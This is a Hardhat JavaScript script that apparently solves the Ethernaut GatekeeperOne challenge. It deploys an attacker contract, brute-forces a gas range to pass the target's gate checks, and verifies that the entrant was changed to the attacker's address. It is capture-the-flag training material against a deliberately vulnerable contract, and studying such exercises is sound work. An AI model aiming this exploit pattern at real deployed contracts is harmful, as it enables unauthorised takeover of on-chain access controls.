const { ethers } = require("hardhat")
const { symbols, resetNode } = require("../helper-hardhat-config")

async function main() {
    await resetNode()
    let owner, tx, res, finalval
    let [attacker] = await ethers.getSigners()
    let instanceAddress = "0x4Ca7e39A4DB4156dD57834677c0fCe17D9438B94"
    let target = await ethers.getContractAt("GatekeeperOne", instanceAddress)
    let attackerContractFactory = await ethers.getContractFactory(
        "GatekeeperOneAttacker"
    )
    let attackerContract = await attackerContractFactory.deploy(instanceAddress)

    console.log(`Attacker Address: ${attacker.address}`)
    console.log(`Found target contract at address: ${target.address}`)
    console.log(`Attacker Contract deployed at ${attackerContract.address}`)

    // Attack
    let [gaslow, gashigh] = [7590, 7592].map((x) => x + 50000)
    console.log(`Searching between gas: ${gaslow} - ${gashigh}`)
    tx = await attackerContract.attack(gaslow, gashigh, { gasLimit: 300000 })
    res = await tx.wait(1)
    if (res.events[0]) {
        finalval = parseInt(res.events[0].data)
    }
    console.log(`Gas needed: ${finalval}`)

    // Check
    owner = await target.entrant()
    if (owner == attacker.address) {
        console.log(`${symbols.success} Set entrant correctly!`)
    } else {
        console.log(`${symbols.error} Entrant set to ${owner}...`)
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error)
        process.exit(1)
    })

module.exports = { main: main }
